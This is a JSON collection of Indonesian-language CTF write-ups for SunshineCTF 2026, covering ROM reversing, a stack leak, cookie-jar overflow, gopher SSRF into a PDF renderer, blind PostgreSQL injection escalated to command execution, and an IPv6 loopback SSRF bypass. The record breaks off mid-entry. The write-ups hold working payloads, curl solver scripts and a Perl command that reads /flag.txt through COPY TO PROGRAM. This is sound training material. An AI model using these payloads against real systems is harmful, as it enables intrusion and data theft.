        "content": "Header BPS menunjukkan source ROM 512 KiB dan target ROM 1 MiB. Action patch\nyang berisi byte baru menghasilkan tiga patch kecil dan satu payload 71 byte.\nByte `0x0A` pada offset ROM `$7FD7` adalah field ukuran ROM pada header SNES,\nbukan bagian dari flag."
      },
      {
        "title": "Analisis Statis dan Dinamis",
        "content": "Payload utama berada di bank `$10`, mulai alamat `$800B`. Awal routine dapat\ndibaca sebagai:\n\n```asm\nLDA $8022,X\nBEQ done\nEOR #$5A\nSTA $7EC100,X\nINX\nBRA loop\n```\n\nRoutine membaca data terenkripsi mulai `$8022`, XOR setiap byte dengan `0x5A`,\nlalu berhenti pada byte nol."
      },
      {
        "title": "Algoritma Validasi dan Encoding",
        "content": "Byte terenkripsi yang ditemukan adalah:\n\n```text\n2f 34 21 1c 6b 3b 17 69 05 35 14 05 17 6e 28 6b 6a 27 00\n```\n\nSetelah XOR `0x5A`, payload menghasilkan marker berikut. Marker ini memakai prefix obfuscated `un` dan sentinel `Z`; solver mengambil isi di antara kurung kurawal lalu membungkusnya dengan format flag SunshineCTF `sun{...}`:\n\n```text\nun{F1aM3_oN_M4r10}Z\n```\n\nBagian yang dibatasi `{...}` adalah isi flag. `solve.py` mengambil bagian\ntersebut dan membungkusnya dengan prefix format challenge `sun`."
      },
      {
        "title": "Penyusunan Solver",
        "content": "Jalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\nsun{F1aM3_oN_M4r10}\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{F1aM3_oN_M4r10}\n```"
      },
      {
        "title": "Catatan",
        "content": "Analisis dilakukan hanya terhadap file patch lokal. ROM asli tidak diperlukan\nkarena seluruh byte yang relevan untuk routine dekripsi berada di action\n`TargetRead` pada patch BPS."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{F1aM3_oN_M4r10}",
    "lessonsLearned": "Pisahkan header atau metadata patch dari payload executable. Saat hasil decoding memakai marker yang tidak sama dengan format flag, dokumentasikan normalisasinya secara eksplisit agar tidak mengklaim output mentah sebagai flag final."
  },
  {
    "id": "sunshinectf-reverse-robocall",
    "title": "RoboCall",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Service menu menyimpan flag pada stack melalui `place_flag()`. Alur cancel plan kemudian membaca nilai stack yang belum diinisialisasi dan membocorkan potongan flag sebagai integer 32-bit little-endian.",
    "problemDescription": "Temukan urutan menu yang mempertahankan data stack, picu uninitialized read, lalu ubah setiap integer yang bocor menjadi chunk empat byte dan gabungkan hasilnya.",
    "tools": [
      "file",
      "checksec",
      "GDB",
      "pwntools",
      "Python 3",
      "little-endian decoding"
    ],
    "analysis": "Input awal `42` mengaktifkan fast mode, setelah itu urutan menu mengatur ulang stack frame sebelum parser menerima input invalid. Nilai yang dicetak pada pesan konfirmasi dikonversi dari integer ke bytes little-endian untuk memulihkan seluruh flag.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "RoboCall adalah challenge REV yang ternyata mengarah ke bug stack leak. Service meminta user membatalkan langganan Premium Cable Inc lewat menu interaktif. Flag tidak dicetak langsung, tapi diletakkan di stack oleh fungsi `place_flag()`, lalu bisa bocor lewat alur menu tertentu.\n\nFlag valid:\n\n```text\nsun{you_must_be_some_sort_of_nimble_space_navigator}\n```"
      },
      {
        "title": "File Challenge",
        "content": "File utama:\n\n```text\nrobocall\n```\n\nBinary merupakan ELF 64-bit, PIE enabled, dan tidak stripped. Karena symbol masih ada, nama fungsi seperti `main`, `place_flag`, dan beberapa handler menu bisa dibaca langsung dari tabel symbol/disassembly."
      },
      {
        "title": "Analisis Awal",
        "content": "Pemeriksaan awal yang dipakai:\n\n```bash\nfile ./robocall\nchecksec --file=./robocall\nstrings -a ./robocall | head -n 100\nreadelf -s ./robocall\nobjdump -d -M intel ./robocall\n```\n\nDari `strings` dan symbol, terlihat beberapa menu interaktif seperti:\n\n```text\nYour goal is to cancel your subscription to Premium Cable Inc\nCall Premium Cable Inc.\nEmail Premium Cable Inc.\nScream in a mix of frustration and hatred towards the FTC.\n```\n\nAda juga fungsi menarik bernama `place_flag()`. Fungsi ini membuka `flag.txt`, membaca flag, lalu menaruh isi flag ke stack dalam bentuk beberapa chunk 4 byte. Flag tidak disimpan sebagai string utuh di `.rodata`."
      },
      {
        "title": "Analisis Statis dan Dinamis",
        "content": "Alur pentingnya:\n\n1. Program menjalankan menu robocall interaktif.\n2. `place_flag()` membaca isi `flag.txt`.\n3. Isi flag disebar ke beberapa slot stack sebagai integer 32-bit.\n4. Handler menu tertentu akan membuat stack frame lama tertinggal.\n5. Menu cancel plan membaca nilai stack yang belum diinisialisasi.\n6. Nilai integer itu dicetak balik ke user lewat pesan konfirmasi.\n\nBug utamanya ada di stack reuse / uninitialized stack read. Value yang seharusnya berasal dari input user ternyata bisa berisi sisa data stack dari frame sebelumnya, termasuk potongan flag yang ditaruh oleh `place_flag()`.\n\nAda juga hidden input `42` di awal program. Input ini membuat delay `nanosleep` menjadi 0, jadi proses leak bisa jauh lebih cepat."
      },
      {
        "title": "Algoritma Validasi dan Encoding",
        "content": "Tidak ada encoding rumit. Flag hanya dipecah menjadi chunk 4 byte little-endian.\n\nContoh leak awal:\n\n```text\n2070836595 -> b'sun{'\n1601531769 -> b'you_'\n1953723757 -> b'must'\n1600479839 -> b'_be_'\n```\n\nInteger hasil leak dikonversi balik ke byte little-endian:\n\n```python\nchunk = (value & 0xffffffff).to_bytes(4, \"little\")\n```\n\nSetelah semua chunk digabung, hasilnya menjadi:\n\n```text\nsun{you_must_be_some_sort_of_nimble_space_navigator}\n```"
      },
      {
        "title": "Penyusunan Solver",
        "content": "Solver melakukan beberapa hal:\n\n1. Mengirim input awal `42` untuk fast mode.\n2. Menjalankan urutan menu tertentu untuk menggeser posisi stack.\n3. Masuk ke flow cancel plan.\n4. Mengirim input invalid supaya parser gagal.\n5. Membaca integer yang bocor dari pesan:\n\n```text\nYou've entered \"<angka>\", are you sure\n```\n\n6. Mengubah integer menjadi 4 byte little-endian.\n7. Menggabungkan semua chunk sampai flag lengkap.\n\nUrutan chunk yang berhasil didapat dari remote:\n\n```text\n[00] ('R',)                             2070836595 -> b'sun{'\n[01] ('S', 'S', 'S', 'S')               1601531769 -> b'you_'\n[02] ('S', 'R')                         1953723757 -> b'must'\n[03] ('T1',)                            1600479839 -> b'_be_'\n[04] ('S', 'S', 'S', 'S', 'S')          1701670771 -> b'some'\n[05] ('S', 'S', 'R')                    1919906655 -> b'_sor'\n[06] ('S', 'T1')                        1718574964 -> b't_of'\n[07] ('S', 'S', 'S', 'S', 'S', 'S')     1835626079 -> b'_nim'\n[08] ('S', 'S', 'S', 'R')               1600482402 -> b'ble_'\n[09] ('S', 'S', 'T1')                   1667330163 -> b'spac'\n```\n\nSisa chunk dari solver melengkapi string menjadi:\n\n```text\nsun{you_must_be_some_sort_of_nimble_space_navigator}\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{you_must_be_some_sort_of_nimble_space_navigator}\n```"
      },
      {
        "title": "Catatan",
        "content": "Remote kadang memutus koneksi saat solver membuka koneksi berkali-kali terlalu cepat. Solusinya adalah menambahkan retry, timeout lebih panjang, dan jeda kecil antar leak.\n\nCommand final:\n\n```bash\npython3 solve.py sunshinectf.games 26199 --timeout 30 --retries 12\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{you_must_be_some_sort_of_nimble_space_navigator}",
    "lessonsLearned": "Inisialisasi seluruh variabel sebelum dibaca dan jangan mengandalkan layout stack. Kebocoran nilai yang tampak kecil dapat dirangkai menjadi disclosure penuh jika state program dapat dikendalikan."
  },
  {
    "id": "sunshinectf-web-cookiecorp",
    "title": "CookieCorp",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Inspector bot menulis setiap ingredient sebagai cookie. Dengan melebihi batas cookie per domain, cookie role milik inspector terevict dan cookie `role=chief` menjadi role yang dipakai saat proses sealing.",
    "problemDescription": "Buat recipe dengan banyak ingredient cookie, pahami urutan eviction browser, dan ganti role inspector tanpa mengambil alih session cookie-nya.",
    "tools": [
      "curl",
      "JavaScript source review",
      "Python 3",
      "HTTP session analysis"
    ],
    "analysis": "JavaScript `mixer.js` membangun `document.cookie` dari input ingredient tanpa membatasi nama cookie. Payload sekitar 179 junk cookies diikuti `role=chief` membuat cookie lama terevict; bot tetap memakai session inspector tetapi request sealing membawa role `chief`.",
    "solution": [
      {
        "title": "Flag",
        "content": "```text\nsun{c00kie_jar_0verfl0w_ev1cts_the_chief}\n```"
      },
      {
        "title": "Recon",
        "content": "Target:\n\n```bash\nBASE='https://tomorrow.web.2026.sunshinectf.games'\n```\n\nRegister baker baru:\n\n```bash\nUSER=\"baker_$(date +%s)_$RANDOM\"\nPASS=\"$(openssl rand -hex 8)\"\n\ncurl -sk -c jar.txt -b jar.txt \\\n  -H 'content-type: application/json' \\\n  -d \"{\\\"username\\\":\\\"$USER\\\",\\\"password\\\":\\\"$PASS\\\"}\" \\\n  \"$BASE/register\" | jq .\n```\n\nResponse:\n\n```json\n{\n  \"ok\": true,\n  \"user\": \"baker_1790438641_4045\",\n  \"role\": \"baker\"\n}\n```\n\nSetelah login, dashboard hanya memberikan akses normal sebagai baker. Link yang menarik ada di `/builder`.\n\n```bash\ncurl -sk -b jar.txt \"$BASE/builder\" -o builder.html\ngrep -nEi 'fetch|api|recipe|ingredient|review|inspect|submit|seal|chief|golden' builder.html\n```\n\nBagian penting dari builder:\n\n```javascript\nconst body = {\n  title: document.getElementById('title').value,\n  ingredients: collect()\n};\n\nfetch('/api/recipe', {\n  method: 'POST',\n  headers: { 'content-type': 'application/json' },\n  body: JSON.stringify(body)\n});\n```\n\nFormat recipe valid:\n\n```json\n{\n  \"title\": \"test\",\n  \"ingredients\": [\n    {\n      \"name\": \"flour\",\n      \"value\": \"2 cups\"\n    }\n  ]\n}\n```\n\nSubmit recipe:\n\n```javascript\nfetch('/api/recipe/' + currentId + '/submit', { method: 'POST' });\n```\n\nJadi route utama:\n\n```text\nPOST /api/recipe\nPOST /api/recipe/:id/submit\nGET  /recipe/:id\nGET  /review/:id\n```"
      },
      {
        "title": "Halaman review",
        "content": "Setelah batch dibuat dan disubmit, `/recipe/:id` menampilkan status. Batch normal diproses menjadi standard seal.\n\n```bash\nID=$(curl -sk -b jar.txt -H 'content-type: application/json' \\\n  -d '{\"title\":\"test\",\"ingredients\":[{\"name\":\"flour\",\"value\":\"2 cups\"},{\"name\":\"atomic_sprinkles\",\"value\":\"dash\"}]}' \\\n  \"$BASE/api/recipe\" | jq -r '.id')\n\ncurl -sk -b jar.txt -X POST \"$BASE/api/recipe/$ID/submit\" | jq .\nsleep 5\ncurl -sk -b jar.txt \"$BASE/recipe/$ID\" | grep -Eio 'GOLDEN SEAL|STANDARD SEAL|reviewed|queued|chief|flag'\n```\n\nOutput normal:\n\n```text\nreviewed\nSTANDARD SEAL\n```\n\nDi halaman recipe ada link:\n\n```html\n<a href=\"/review/<id>\">Inspector's-eye view</a>\n```\n\nIsi `/review/:id` ternyata memuat recipe ke JavaScript:\n\n```html\n<script>\n  window.__recipe = {\n    \"id\": \"...\",\n    \"ingredients\": [\n      {\"name\":\"flour\",\"value\":\"2cups\"},\n      {\"name\":\"atomic_sprinkles\",\"value\":\"dash\"}\n    ]\n  };\n</script>\n<script src=\"/static/js/mixer.js\"></script>\n```"
      },
      {
        "title": "Bug di mixer.js",
        "content": "File `/static/js/mixer.js` adalah kuncinya.\n\n```bash\ncurl -sk \"$BASE/static/js/mixer.js\" -o mixer.js\ncat mixer.js\n```\n\nPotongan penting:\n\n```javascript\nfunction dispense(ing) {\n  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';\n}\n\nasync function run() {\n  for (var i = 0; i < recipe.ingredients.length; i++) {\n    dispense(recipe.ingredients[i]);\n  }\n\n  var resp = await fetch('/api/seal', {\n    method: 'POST',\n    headers: { 'content-type': 'application/json' },\n    credentials: 'same-origin',\n    body: JSON.stringify({ recipeId: recipe.id }),\n  });\n\n  result = await resp.json().catch(function () { return { ok: false }; });\n\n  if (result && result.seal === 'chief') {\n    log('> GOLDEN SEAL APPLIED. batch certified by the Chief.', 'gold');\n  } else if (result && result.seal === 'reviewed') {\n    log('> standard seal applied. batch reviewed.', 'ok');\n  }\n}\n```\n\nJadi setiap ingredient akan dijadikan cookie oleh browser inspector bot.\n\nContoh:\n\n```json\n{\"name\":\"debugcookie\",\"value\":\"abc123\"}\n```\n\nakan dijalankan sebagai:\n\n```javascript\ndocument.cookie = 'debugcookie=abc123; path=/';\n```\n\nIni sempat kelihatan seperti cookie injection biasa. Ide awalnya: set cookie `role=chief`.\n\n```json\n{\"name\":\"role\",\"value\":\"chief\"}\n```\n\nTapi hasilnya tetap standard seal."
      },
      {
        "title": "Rabbit hole",
        "content": "Beberapa payload yang dicoba tapi gagal:\n\n```json\n{\"name\":\"role\",\"value\":\"chief\"}\n{\"name\":\"chief\",\"value\":\"true\"}\n{\"name\":\"golden_seal\",\"value\":\"true\"}\n{\"name\":\"seal\",\"value\":\"chief\"}\n{\"name\":\"session\",\"value\":\"<session baker>\"}\n```\n\nSemua tetap menghasilkan:\n\n```text\nSTANDARD SEAL\n```\n\nDirect request ke `/api/seal` juga tidak bisa dari session baker:\n\n```bash\nSESSION=$(awk '$6==\"session\"{print $7}' jar.txt)\n\ncurl -sk \\\n  -H \"Cookie: role=chief; session=$SESSION\" \\\n  -H 'content-type: application/json' \\\n  -d \"{\\\"recipeId\\\":\\\"$ID\\\"}\" \\\n  \"$BASE/api/seal\"\n```\n\nResponse:\n\n```json\n{\"error\":\"inspector authorization required\"}\n```\n\nArtinya `/api/seal` butuh session inspector bot. Cookie `role=chief` saja tidak cukup kalau session-nya masih baker.\n\nSempat juga dicoba cookie attribute injection seperti:\n\n```json\n{\"name\":\"role\",\"value\":\"chief; path=/api\"}\n{\"name\":\"role\",\"value\":\"chief; path=/api/seal\"}\n{\"name\":\"role\",\"value\":\"chief; Domain=tomorrow.web.2026.sunshinectf.games\"}\n```\n\nTapi value disanitasi. Semicolon dibuang, jadi tidak bisa menyisipkan `path` atau `domain`.\n\nContoh hasil tampilan recipe:\n\n```html\n<td>role</td><td>chiefpath=/api/seal</td>\n```\n\nXSS via `</script>` juga tidak berhasil karena karakter penting di-escape:\n\n```html\n\\u003c/script>\\u003cscript>...\n```\n\nJadi bug-nya bukan XSS klasik."
      },
      {
        "title": "Insight yang benar: cookie jar overflow",
        "content": "Deskripsi challenge menyebut “cookie” berkali-kali, dan builder juga memberi batas:\n\n```text\n300 ingredients\n```\n\nBatas ingredient yang besar ini ternyata bukan kebetulan.\n\nKarena setiap ingredient ditulis menjadi cookie, kita bisa membuat banyak cookie baru di browser inspector. Browser punya batas jumlah cookie per domain. Jika jumlah cookie terlalu banyak, cookie lama akan dievict dari cookie jar.\n\nBot inspector punya cookie penting kira-kira seperti:\n\n```text\nsession=<inspector session>\nrole=inspector\n```\n\nTarget kita bukan sekadar menambah `role=chief`, karena duplicate `role` kalah oleh cookie lama. Targetnya adalah memenuhi cookie jar sampai cookie lama `role=inspector` terevict, lalu cookie baru `role=chief` menjadi role yang dipakai saat bot memanggil `/api/seal`.\n\nJumlah yang berhasil adalah sekitar 179 junk cookies, lalu terakhir `role=chief`."
      },
      {
        "title": "Exploit",
        "content": "Payload generator:\n\n```bash\npython3 - <<'PY' | tee /tmp/cookiebomb.json >/dev/null\nimport json\n\nings = [{\"name\": f\"c{i}\", \"value\": \"x\"} for i in range(179)]\nings.append({\"name\": \"role\", \"value\": \"chief\"})\n\nprint(json.dumps({\n    \"title\": \"cookiebomb\",\n    \"ingredients\": ings\n}))\nPY\n```\n\nKirim recipe, submit, lalu tunggu inspector bot:\n\n```bash\nID=$(curl -sk -b jar2.txt \\\n  -H 'content-type: application/json' \\\n  --data-binary @/tmp/cookiebomb.json \\\n  \"$BASE/api/recipe\" | jq -r '.id')\n\necho \"ID=$ID\"\n\ncurl -sk -b jar2.txt -X POST \"$BASE/api/recipe/$ID/submit\" | jq .\n\nsleep 25\n\ncurl -sk -b jar2.txt \"$BASE/recipe/$ID\" \\\n  | grep -Eio 'sun\\{[^}]+\\}|GOLDEN SEAL|STANDARD SEAL|reviewed|queued|chief|flag' \\\n  | head -30\n```\n\nUntuk mencari angka yang pas, saya loop beberapa nilai:\n\n```bash\nfor N in 176 177 178 179 180 181; do\n  python3 - \"$N\" <<'PY' >/tmp/cookiebomb.json\nimport json, sys\n\nn = int(sys.argv[1])\nings = [{\"name\": f\"c{i}\", \"value\": \"x\"} for i in range(n)]\nings.append({\"name\": \"role\", \"value\": \"chief\"})\n\nprint(json.dumps({\n    \"title\": f\"cookiebomb_{n}\",\n    \"ingredients\": ings\n}))\nPY\n\n  ID=$(curl -sk -b jar2.txt \\\n    -H 'content-type: application/json' \\\n    --data-binary @/tmp/cookiebomb.json \\\n    \"$BASE/api/recipe\" | jq -r '.id')\n\n  echo \"== N=$N ID=$ID ==\"\n\n  curl -sk -b jar2.txt -X POST \"$BASE/api/recipe/$ID/submit\" >/dev/null\n\n  sleep 18\n\n  curl -sk -b jar2.txt \"$BASE/recipe/$ID\" \\\n    | grep -Eio 'sun\\{[^}]+\\}|GOLDEN SEAL|STANDARD SEAL|reviewed|queued|chief|flag' \\\n    | head -10\ndone\n```\n\nOutput yang berhasil:\n\n```text\n== N=179 ID=3c4275dfbd1a28f9878f7025 ==\nreviewed\nreviewed\nCHIEF\nGOLDEN SEAL\nChief\nflag\nsun{c00kie_jar_0verfl0w_ev1cts_the_chief}\nchief\n\n== N=180 ID=6719ef3215626a07f0ae623c ==\nreviewed\nreviewed\nCHIEF\nGOLDEN SEAL\nChief\nflag\nsun{c00kie_jar_0verfl0w_ev1cts_the_chief}\nchief\n```"
      },
      {
        "title": "Solver ringkas",
        "content": "```bash\nBASE='https://tomorrow.web.2026.sunshinectf.games'\n\nrm -f jar.txt\nUSER=\"baker_$(date +%s)_$RANDOM\"\nPASS=\"$(openssl rand -hex 8)\"\n\ncurl -sk -c jar.txt -b jar.txt \\\n  -H 'content-type: application/json' \\\n  -d \"{\\\"username\\\":\\\"$USER\\\",\\\"password\\\":\\\"$PASS\\\"}\" \\\n  \"$BASE/register\" | jq .\n\npython3 - <<'PY' >/tmp/cookiebomb.json\nimport json\n\nings = [{\"name\": f\"c{i}\", \"value\": \"x\"} for i in range(179)]\nings.append({\"name\": \"role\", \"value\": \"chief\"})\n\nprint(json.dumps({\n    \"title\": \"cookiebomb\",\n    \"ingredients\": ings\n}))\nPY\n\nID=$(curl -sk -b jar.txt \\\n  -H 'content-type: application/json' \\\n  --data-binary @/tmp/cookiebomb.json \\\n  \"$BASE/api/recipe\" | jq -r '.id')\n\necho \"[+] ID=$ID\"\n\ncurl -sk -b jar.txt -X POST \"$BASE/api/recipe/$ID/submit\" | jq .\n\nsleep 25\n\ncurl -sk -b jar.txt \"$BASE/recipe/$ID\" \\\n  | grep -Eo 'sun\\{[^}]+\\}|GOLDEN SEAL|STANDARD SEAL'\n```"
      },
      {
        "title": "Kenapa exploit ini jalan",
        "content": "`mixer.js` membuat cookie dari setiap ingredient:\n\n```javascript\ndocument.cookie = ing.name + '=' + ing.value + '; path=/';\n```\n\nDengan 179+ ingredient, bot membuat banyak cookie baru di origin yang sama. Browser membatasi jumlah cookie per domain. Saat limit terlewati, cookie lama milik inspector mulai dievict.\n\nBegitu cookie `role=inspector` hilang dan cookie `role=chief` kita masih ada, request bot ke `/api/seal` tetap memakai session inspector, tapi role yang terbaca menjadi chief.\n\nHasilnya server memberi Golden Seal dan menampilkan flag."
      },
      {
        "title": "Final",
        "content": "```text\nsun{c00kie_jar_0verfl0w_ev1cts_the_chief}\n```"
      },
      {
        "title": "Reproducibility note",
        "content": "The cookie-eviction stage depends on the inspector browser's per-domain cookie limit and eviction behavior. The solve therefore treats the observed inspector session as a challenge-specific condition and verifies the resulting seal instead of assuming that every browser uses the same eviction order."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{c00kie_jar_0verfl0w_ev1cts_the_chief}",
    "lessonsLearned": "Input yang ditulis ke cookie harus memvalidasi nama, nilai, jumlah, ukuran, dan atribut cookie. Session, role, dan state otorisasi juga harus dipisahkan sehingga cookie overflow tidak dapat mengubah privilege."
  },
  {
    "id": "sunshinectf-web-groundhog-day",
    "title": "Groundhog Day",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Endpoint publik melakukan server-side fetch terhadap parameter `feed` dan tidak memblokir skema `gopher://`. Gopher SSRF digunakan untuk mengirim request internal ke renderer PDF yang dapat membaca `/flag.txt`.",
    "problemDescription": "Buktikan server-side fetch, susun payload gopher untuk service internal, dan ambil hasil render PDF yang memuat isi file flag.",
    "tools": [
      "curl",
      "Python 3",
      "URL/gopher encoding",
      "PDF text extraction",
      "HTTP analysis"
    ],
    "analysis": "Eksploitasi menggabungkan SSRF, gopher URL, dan perilaku renderer internal. Request diuji bertahap dengan target benign, kemudian payload internal meminta renderer memuat `file:///flag.txt`; flag diekstrak dari field PDF Base64.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug ada di fitur override feed pada `POST /`. Nilai `feed` dikontrol user dan di-fetch oleh server. Skema `gopher://` bisa dipakai untuk mengirim request mentah ke service internal localhost."
      },
      {
        "title": "Target dan File",
        "content": "Target: `https://odyssey.web.2026.sunshinectf.games`\n\nDirektori challenge tidak menyediakan source code; analisis dilakukan secara black-box terhadap service remote."
      },
      {
        "title": "Analisis Awal",
        "content": "HTML halaman utama memiliki komentar ops:\n\n```html\n<form class=\"override\" action=\"/\" method=\"post\">\n  <input id=\"feed\" name=\"feed\" type=\"text\">\n</form>\n```\n\nKomentar yang sama membocorkan default `http://127.0.0.1:8000/feed`. Mengirim URL tersebut ke `feed` membuat server mengambil data dari service internal."
      },
      {
        "title": "Black-box Analysis",
        "content": "Tidak ada source code lokal. Behavior response menunjukkan aplikasi publik melakukan fetch terhadap URL yang diberikan, kemudian menampilkan body yang tidak bisa diparse pada bagian `Raw telemetry`."
      },
      {
        "title": "Vulnerability",
        "content": "SSRF dengan dukungan gopher. Service internal di `127.0.0.1:8000` memiliki endpoint:\n\n```text\nGET  /feed\nGET  /health\nPOST /report\n```\n\n`/report` hanya menerima POST, sehingga request HTTP mentah dikirim melalui URL:\n\n```text\ngopher://127.0.0.1:8000/_POST%20/report%20HTTP/1.1%0D%0A...\n```"
      },
      {
        "title": "Eksploitasi",
        "content": "Body POST dikirim sebagai form `content` dan `title`. Isi `content` memakai HTML `<object>` yang menunjuk ke file lokal:\n\n```html\n<object data=\"file:///flag.txt\" type=\"text/plain\"></object>\n```\n\nEndpoint `/report` merender HTML menggunakan wkhtmltopdf dan mengembalikan PDF dalam JSON, dengan field `data` berupa base64. PDF itu direfleksikan kembali oleh console publik. Teks PDF dapat dibaca untuk mengambil flag."
      },
      {
        "title": "Solver",
        "content": "Jalankan:\n\n```bash\npython3 solve.py\n```\n\nScript membangun request gopher, mengirimnya ke endpoint publik, mengambil field PDF base64, lalu mencari flag-shaped text dari hasil render."
      },
      {
        "title": "Flag",
        "content": "Flag diperoleh dari teks `/flag.txt` yang dirender ke PDF oleh service internal:\n\n```text\nsun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi bergantung pada tiga behavior target: parameter `feed` melakukan server-side fetch, skema gopher tidak diblokir, dan wkhtmltopdf dapat membaca `file:///flag.txt`. Script menggunakan timeout 30 detik dan gagal jelas jika PDF atau flag tidak muncul."
      },
      {
        "title": "Validation note",
        "content": "The `file:///flag.txt` step is a behavior observed from the challenge renderer: a benign HTML object was first tested, then the returned PDF text was checked for the expected flag pattern. This is a black-box observation, not a claim about a locally reviewed renderer implementation."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}",
    "lessonsLearned": "SSRF protection harus memvalidasi scheme, DNS resolution, redirect, IPv4/IPv6 loopback, dan rentang jaringan internal. Service renderer juga tidak boleh diberi akses file lokal tanpa sandbox."
  },
  {
    "id": "sunshinectf-web-planetary-probe",
    "title": "Planetary Probe",
    "category": "Web",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Parameter `planet` pada endpoint `/probe` rentan terhadap boolean-based SQL injection. Perbedaan response `is-carrier` dan `is-null` menjadi oracle untuk membaca flag byte demi byte melalui `COPY ... TO PROGRAM`.",
    "problemDescription": "Gunakan oracle boolean pada endpoint probe, manfaatkan privilege database yang memungkinkan command execution, lalu lakukan binary search terhadap isi `/flag.txt`.",
    "tools": [
      "curl",
      "SQL injection analysis",
      "PostgreSQL",
      "Python 3",
      "binary search"
    ],
    "analysis": "Input dikendalikan melalui ekspresi SQL yang memengaruhi status carrier. Karena role database memiliki `pg_execute_server_program`, query `COPY (SELECT ...) TO PROGRAM` menjalankan command pembanding dan exit code-nya dipantulkan sebagai dua response yang berbeda.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Parameter `planet` pada `/probe` mengalami SQL injection boolean-based. Response `is-carrier` berarti kondisi benar, sedangkan `is-null` berarti kondisi salah."
      },
      {
        "title": "Target dan File",
        "content": "- Target: `https://planetary.web.2026.sunshinectf.games/`\n- Source lokal tidak diberikan; challenge dikerjakan sebagai blankbox.\n- Solver: [solve.py](./solve.py)"
      },
      {
        "title": "Analisis Awal",
        "content": "`/probe?planet=MARS` menghasilkan `<body class=\"is-carrier\">`, sedangkan planet yang tidak ada menghasilkan `is-null`.\n\nPayload berikut membuktikan SQL injection:\n\n```text\nMARS' AND '1'='1' AND '1'='1\nMARS' AND '1'='2' AND '1'='1\n```"
      },
      {
        "title": "Black-box Analysis",
        "content": "Source code tidak diberikan; kesimpulan di bawah berasal dari observasi behavior service dan solver. Dari behavior dan katalog PostgreSQL, backend menggunakan PostgreSQL dan input user masuk ke query tanpa parameter binding aman."
      },
      {
        "title": "Vulnerability",
        "content": "Role database memiliki membership `pg_execute_server_program`. Transaksi read-only memblokir penulisan database biasa, tetapi `COPY (SELECT ...) TO PROGRAM` tetap bisa menjalankan command di container database.\n\nExit code command menjadi oracle: exit `0` menghasilkan carrier, sedangkan exit non-zero menghasilkan null."
      },
      {
        "title": "Eksploitasi",
        "content": "Solver menjalankan command Perl yang membaca satu byte dari `/flag.txt` dan exit berdasarkan perbandingan nilainya:\n\n```text\nperl -e 'open F,\"<:raw\",\"/flag.txt\"; seek F,N,0; read F,$b,1; exit(ord($b)<=M?0:1)'\n```\n\nBinary search dilakukan untuk setiap byte sampai karakter `}` ditemukan. Setiap byte berasal dari response aplikasi, bukan tebakan."
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py\npython3 solve.py https://planetary.web.2026.sunshinectf.games\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Target kadang memakai backend berbeda dan dapat timeout. Solver memakai retry, timeout 45 detik, dan header `X-Forwarded-For` yang sama seperti validasi manual. Semua request diarahkan hanya ke endpoint `/probe` target challenge."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}",
    "lessonsLearned": "Gunakan parameterized query dan least privilege untuk role database. Transaksi read-only atau filter aplikasi tidak cukup jika privilege server program masih memungkinkan eksekusi command."
  },
  {
    "id": "sunshinectf-web-sitecheck",
    "title": "SiteCheck",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Validasi URL pada endpoint `/scan` gagal menangani IPv6 loopback. URL `http://[::1]:3000/` diterima browser drone dan membuka halaman internal yang menampilkan clearance token serta flag.",
    "problemDescription": "Buat akun, uji parser URL pada endpoint scan, gunakan IPv6 loopback untuk mencapai service internal, lalu OCR screenshot hasil scan untuk mengambil flag.",
    "tools": [
      "curl",
      "Python 3",
      "IPv6/SSRF analysis",
      "OCR",
      "HTTP session analysis"
    ],
    "analysis": "Alamat `127.0.0.1` ditolak, tetapi representasi IPv6 `::1` lolos validasi. Browser drone tetap memiliki akses ke service internal pada port 3000; screenshot evidence memperlihatkan halaman clearance dan flag yang kemudian diekstrak secara lokal.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug ada di validasi URL pada endpoint `/scan`. Format IPv6 loopback `http://[::1]:3000/...` lolos validasi internal-address, lalu diambil oleh browser drone."
      },
      {
        "title": "Target dan File",
        "content": "- Target: `https://spaceship.web.2026.sunshinectf.games`\n- [solve.py](./solve.py)"
      },
      {
        "title": "Analisis Awal",
        "content": "Akun biasa bisa dibuat lewat `/register`. Setelah login, `/scan` menerima URL dan menghasilkan report dengan screenshot.\n\nUji `http://127.0.0.1` ditolak, tetapi `http://[::1]:3000/` diterima. Report menunjukkan HTTP 200, sehingga service internal aplikasi berjalan di port 3000 dan validasi tidak menangani loopback IPv6 dengan benar."
      },
      {
        "title": "Black-box Analysis",
        "content": "Tidak ada source code lokal; challenge berjalan sebagai blankbox. Behavior endpoint membuktikan bahwa validasi URL dan browser drone berada di server challenge."
      },
      {
        "title": "Vulnerability",
